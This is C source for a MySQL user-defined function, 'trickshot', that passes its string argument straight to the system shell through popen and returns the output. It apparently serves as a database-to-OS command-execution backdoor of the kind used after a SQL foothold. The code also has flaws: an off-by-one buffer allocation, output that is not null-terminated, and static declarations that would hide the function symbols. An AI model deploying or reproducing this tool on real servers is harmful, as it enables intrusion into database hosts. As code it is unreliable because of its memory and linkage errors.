
#include <string.h>
#include <stdlib.h>

#include <mysql.h>

char *buff;
unsigned int bsize = 256;

static my_bool trickshot_init(UDF_INIT *initid, UDF_ARGS *args ,char *message);
static char *trickshot(UDF_INIT *initid,UDF_ARGS *args,char *is_null,char *error);
static void trickshot_deinit(UDF_INIT *initid);


my_bool trickshot_init(UDF_INIT *initid, UDF_ARGS *args, char *message){
    if(args->arg_count != 1 || args->arg_type[0] != STRING_RESULT){
        strcpy(message, "trickshot(): Incorrect usage... >:(");
        return 1;
    }
    buff = calloc(bsize, 1);
    return 0;
}

void trickshot_deinit(UDF_INIT *initid){
    free(buff);
}

char *trickshot(UDF_INIT *initid,UDF_ARGS *args,char *is_null,char *error){
    char *cmd = args->args[0];
    size_t cmd_len = strlen(cmd);
    FILE *fd;
    char *safe_command = malloc(cmd_len + 5);
    strcpy(safe_command, (const char *)(cmd));
    strcat(safe_command, " 2>&1");
    fd = popen(safe_command, "r");

    char buffer[256];
    size_t chread;
    /* String to store entire command contents in */
    size_t comalloc = 256;
    size_t comlen   = 0;
    char *comout   = malloc(comalloc);
 
    /* Use fread so binary data is dealt with correctly */
    while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
        if (comlen + chread >= comalloc) {
            comalloc *= 2;
            comout = realloc(comout, comalloc);
        }
        memmove(comout + comlen, buffer, chread);
        comlen += chread;
    }
    pclose(fd);
    free(safe_command);
    return comout;
}

